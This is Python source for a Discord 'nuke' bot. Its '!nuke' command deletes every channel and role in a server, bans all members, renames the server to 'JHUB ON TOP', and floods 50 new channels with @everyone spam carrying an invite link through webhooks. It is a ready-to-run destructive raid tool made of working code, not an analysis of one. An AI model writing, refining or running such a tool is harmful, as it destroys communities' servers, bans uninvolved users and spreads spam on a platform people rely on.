import discord
from discord.ext import commands
import os
import asyncio

# Configuration
prefix = "!"
channel_name = "nuked-by-jhub"
webhook_name = "JHUB ON TOP"
webhook_pfp = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
guild_name = "JHUB ON TOP"
guild_icon = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)

# Events
@bot.event
async def on_ready():
    print(f"{bot.user} is online and ready.")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    # Delete channels
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    # Delete roles
    for role in guild.roles:
        try:
            await role.delete()
        except:
            pass

    # Ban members
    for member in guild.members:
        try:
            await member.ban(reason="Nuked by JHUB")
        except:
            pass

    # Rename server and change icon
    try:
        with open("icon.gif", "wb") as f:
            f.write(await (await bot.session.get(guild_icon)).read())
        with open("icon.gif", "rb") as f:
            await guild.edit(name=guild_name, icon=f.read())
    except:
        pass

    # Create new channels with spam
    for _ in range(50):
        try:
            channel = await guild.create_text_channel(channel_name)
            webhook = await channel.create_webhook(name=webhook_name)
            for _ in range(20):
                try:
                    await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
                except:
                    pass
        except:
            pass

# Safe token loading
if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("Error: DISCORD_TOKEN environment variable not found.")
        exit(1)
    bot.run(token)


